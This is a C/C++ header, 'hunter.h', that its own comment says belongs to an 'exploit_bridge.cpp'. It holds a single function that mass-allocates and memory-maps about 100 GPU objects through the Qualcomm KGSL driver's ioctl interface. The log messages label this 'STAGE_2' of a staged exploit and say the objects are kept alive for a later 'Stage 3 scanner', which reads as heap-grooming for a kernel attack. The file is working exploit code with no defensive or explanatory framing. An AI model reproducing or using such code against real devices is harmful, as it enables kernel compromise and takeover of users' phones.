
#include <errno.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

// hunter.h: Included inside exploit_bridge.cpp at line 400
// It has access to structs: kgsl_gpuobj_alloc, kgsl_gpuobj_info
// and macros: IOCTL_KGSL_GPUOBJ_ALLOC, IOCTL_KGSL_GPUOBJ_INFO

static void hunter_mass_allocate(int kgsl_fd, uint32_t &target_id,
                                 uint64_t &target_gpuaddr) {
  esm_log("[STAGE_2] [HUNTER] Initiating 100-object Identity scan...");
  int success_count = 0;
  for (int i = 0; i < 100; i++) {
    struct kgsl_gpuobj_alloc alloc_req;
    memset(&alloc_req, 0, sizeof(alloc_req));
    alloc_req.size = 0x1000;

    // Attempt allocation
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc_req) == 0 &&
        alloc_req.id != 0) {

      struct kgsl_gpuobj_info info;
      memset(&info, 0, sizeof(info));
      info.id = alloc_req.id;

      if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info) == 0 &&
          info.gpuaddr != 0) {

        void *map = mmap(NULL, (size_t)info.size, PROT_READ | PROT_WRITE,
                         MAP_SHARED, kgsl_fd, (off_t)info.gpuaddr);
        if (map != MAP_FAILED) {
          success_count++;
          if (i % 25 == 0)
            esm_log("[STAGE_2] [HUNTER] %d mappings established...",
                    success_count);
          target_id = alloc_req.id;
          target_gpuaddr = info.gpuaddr;
          // Objects stay alive in process maps for Stage 3 scanner
        } else {
          esm_log("[STAGE_2] [HUNTER] mmap failed for id %u (errno=%d)",
                  alloc_req.id, errno);
        }
      } else {
        esm_log("[STAGE_2] [HUNTER] INFO failed for id %u (errno=%d)",
                alloc_req.id, errno);
      }
    } else {
      // Only log first failure to avoid spam
      if (i == 0)
        esm_log("[STAGE_2] [HUNTER] ALLOC failed (errno=%d)", errno);
    }
  }
  esm_log("[STAGE_2] [HUNTER] Mass-allocation complete. Total objects: %d",
          success_count);
}
